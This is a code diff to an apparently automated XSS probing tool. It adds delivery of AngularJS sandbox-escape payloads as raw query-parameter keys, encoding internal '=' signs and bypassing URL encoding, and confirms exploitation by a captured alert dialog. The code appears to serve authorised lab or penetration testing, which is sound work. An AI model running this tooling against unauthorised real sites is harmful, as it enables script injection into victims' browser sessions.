@@ -100,6 +100,25 @@ def _build_url(url: str, point: str, value: str, location: str) -> str:
     return _set_query_param(url, point, value)  # query (default)
 
 
+def _build_angular_key_url(url: str, point: str, expr: str) -> str:
+    """Deliver an AngularJS ``$parse``-of-KEY sandbox escape: the Angular expression is sent as the
+    KEY of a SECOND query param, so the client's ``$parse(<paramName>)(...)`` evaluates it. Shape
+    (the lab needs it verbatim): ``<path>?<point>=1&<EXPR_AS_KEY>=1``.
+
+    The stored ``angular_no_strings`` vector is ``<expr>=1`` — a trailing ``=1`` that is the param's
+    KEY→value separator. We keep that final ``=1`` and percent-encode every INTERNAL ``=`` (e.g. the
+    ``charAt=`` assignment) to ``%3d`` so it stays part of the KEY instead of ending it. All other
+    expression chars (``& [ ] | ; ( ) . : { }``) are kept RAW — the browser must send them as-is, so
+    the query is built by hand (NOT via ``urlencode``, which was why value-delivery clobbered this
+    structure) and handed to the browser verbatim."""
+    key_part, sep, value_part = expr.rpartition("=")
+    if not sep:  # no trailing =value in the stored vector; treat the whole expr as the key
+        key_part, value_part = expr, "1"
+    raw_query = f"{point}=1&{key_part.replace('=', '%3d')}={value_part}"
+    parts = urlparse(url)
+    return urlunparse(parts._replace(query=raw_query))  # urlunparse joins; it does NOT re-encode
+
+
 def _field_selector(snap: Dict[str, Any], point: str) -> str:
     """Build a CSS selector for the form field named ``point`` from a browser snapshot
     (matching name, then id). Falls back to a plain [name=...] selector."""
@@ -192,9 +211,17 @@ async def _read_dom(browser: Any) -> str:
         return ""
 
 
-async def _deliver(browser: Any, url: str, point: str, value: str, location: str) -> None:
+async def _deliver(browser: Any, url: str, point: str, value: str, location: str,
+                   key_delivery: bool = False) -> None:
     """Deliver ``value`` at the injection point through the live browser. URL-borne locations
-    navigate; a form field is filled and submitted. Reuses the authenticated session."""
+    navigate; a form field is filled and submitted. Reuses the authenticated session.
+
+    ``key_delivery`` True → ``value`` is an AngularJS ``$parse``-of-KEY sandbox escape, delivered as
+    a RAW second query-param KEY (``?<point>=1&<expr>=1`` with internal ``=`` → ``%3d``), bypassing
+    the url-encoding of the normal value/fragment/path/body paths. ``location`` is ignored."""
+    if key_delivery:
+        await browser.navigate(_build_angular_key_url(url, point, value))
+        return
     if location == "body":
         await browser.navigate(url)
         snap = await browser.snapshot()
@@ -220,43 +247,60 @@ def _angular_vectors(version: str, quotes_encoded: bool) -> List[str]:
 
 def _candidate_payloads(context: str, quotes_encoded: bool, version: str, mark: str,
                         framework: str = "", angular_parse_sink: bool = False,
-                        ) -> "List[tuple[str, bool]]":
-    """Build the ordered candidate list as ``(payload, angular_fixed)`` tuples.
+                        angular_parse_key_sink: bool = False,
+                        ) -> "List[tuple[str, bool, bool]]":
+    """Build the ordered candidate list as ``(payload, angular_fixed, key_delivery)`` tuples.
 
     ``angular_fixed`` True → a fixed AngularJS ``alert(1)`` sandbox-escape vector, delivered RAW and
     confirmed by ANY fired dialog; False → a MARK-substituted context payload confirmed only when
-    the dialog echoes the unique MARK.
+    the dialog echoes the unique MARK. ``key_delivery`` True → an Angular ``$parse``-of-KEY escape
+    delivered as a raw second query-param KEY (see ``_build_angular_key_url``) rather than a value.
 
     For an Angular app (``framework == "angularjs"`` OR a detected ``$parse``/``$eval`` sink) the
-    Angular vectors are ALWAYS included in addition to the normal context payloads — tried FIRST
-    when the value feeds an Angular expression (surface ``angular_expression``/``js_string_*`` or
-    ``angular_parse_sink``), and appended after the context payloads otherwise. Non-Angular targets
-    get exactly the context payloads, unchanged."""
-    def _context_list() -> "List[tuple[str, bool]]":
+    Angular value-vectors are ALWAYS included in addition to the normal context payloads — tried
+    FIRST when the value feeds an Angular expression (surface ``angular_expression``/``js_string_*``
+    or ``angular_parse_sink``), and appended after the context payloads otherwise. When the sink
+    consumes a param KEY (``angular_parse_key_sink``) the string-free ``angular_no_strings`` vectors
+    are ALSO appended as key-delivery candidates — tried LAST so they fire only once the (doomed)
+    value-delivery vectors have missed. Non-Angular targets get exactly the context payloads,
+    unchanged, and no key-delivery candidate is ever added for them."""
+    def _context_list() -> "List[tuple[str, bool, bool]]":
         ctx_payloads = get_value("xss", "context_payloads", {}) or {}
         group = context
         if quotes_encoded:
             qf = f"{context}_quote_free"
             if ctx_payloads.get(qf):
                 group = qf
-        return [(p.replace("{MARK}", mark), False) for p in (ctx_payloads.get(group, []) or [])]
+        return [(p.replace("{MARK}", mark), False, False)
+                for p in (ctx_payloads.get(group, []) or [])]
 
-    # Pure Angular interpolation context: Angular vectors only (unchanged behaviour).
+    def _key_candidates() -> "List[tuple[str, bool, bool]]":
+        # Only for a param-KEY $parse sink. The angular_no_strings vectors are purpose-built for
+        # key delivery (they carry the trailing ``=1`` param separator and need no string literal);
+        # a fired dialog proves the escape (angular_fixed=True).
+        if not angular_parse_key_sink:
+            return []
+        ns = (get_value("xss", "angular_no_strings", {}) or {}).get(version, []) or []
+        return [(expr, True, True) for expr in ns]
+
+    # Pure Angular interpolation context: Angular vectors only (plus a key candidate iff key sink).
     if context == "angular_expression":
-        return [(p, True) for p in _angular_vectors(version, quotes_encoded)]
+        return [(p, True, False) for p in _angular_vectors(version, quotes_encoded)] \
+            + _key_candidates()
 
     is_angular = framework == "angularjs" or angular_parse_sink
     if not is_angular:
         return _context_list()
 
-    angular_firsts = [(p, True) for p in _angular_vectors(version, quotes_encoded)]
+    angular_firsts = [(p, True, False) for p in _angular_vectors(version, quotes_encoded)]
     # The value feeds an Angular expression sink (surface JS-string or an explicit $parse sink):
-    # try the Angular CSTI vectors before the (doomed) JS-string break-outs.
+    # try the Angular CSTI value-vectors before the (doomed) JS-string break-outs, then the raw
+    # key-delivery vectors last for a param-KEY sink.
     if angular_parse_sink or str(context).startswith("js_string"):
-        return angular_firsts + _context_list()
+        return angular_firsts + _context_list() + _key_candidates()
     # Angular app, but the reflection surface is unrelated (html_body/attr/href): context payloads
-    # first, Angular vectors appended as a fallback.
-    return _context_list() + angular_firsts
+    # first, Angular value-vectors appended as a fallback, key-delivery vectors last.
+    return _context_list() + angular_firsts + _key_candidates()
 
 
 async def _xss_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
@@ -290,10 +334,12 @@ async def _xss_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
         context = str(info.get("context"))
         quotes_encoded = bool(info.get("quotes_encoded"))
         angular_parse_sink = bool(info.get("angular_parse_sink"))
+        angular_parse_key_sink = bool(info.get("angular_parse_key_sink"))
         framework = str(info.get("framework") or "")
         version = detect_angular_version(dom)
         steps.append({"label": "classify", "context": context,
                       "quotes_encoded": quotes_encoded, "angular_parse_sink": angular_parse_sink,
+                      "angular_parse_key_sink": angular_parse_key_sink,
                       "framework": framework, "framework_version": version,
                       "snippet": info.get("snippet")})
 
@@ -305,7 +351,8 @@ async def _xss_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
 
         candidates = _candidate_payloads(context, quotes_encoded, version, mark,
                                          framework=framework,
-                                         angular_parse_sink=angular_parse_sink)
+                                         angular_parse_sink=angular_parse_sink,
+                                         angular_parse_key_sink=angular_parse_key_sink)
         if not candidates:
             return {"ok": True, "confirmed": False, "context": context,
                     "framework_version": version,
@@ -313,9 +360,9 @@ async def _xss_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
                                f"(version {version}).", "steps": steps}
 
         # 2. Deliver each candidate; confirm strictly on a captured alert() dialog.
-        for payload, angular_fixed in candidates:
+        for payload, angular_fixed, key_delivery in candidates:
             await _reset_dialog(browser)
-            await _deliver(browser, url, point, payload, location)
+            await _deliver(browser, url, point, payload, location, key_delivery=key_delivery)
             dialog = await _capture_dialog(browser)
             if dialog is None:
                 steps.append({"label": "miss (no dialog)", "payload": payload})
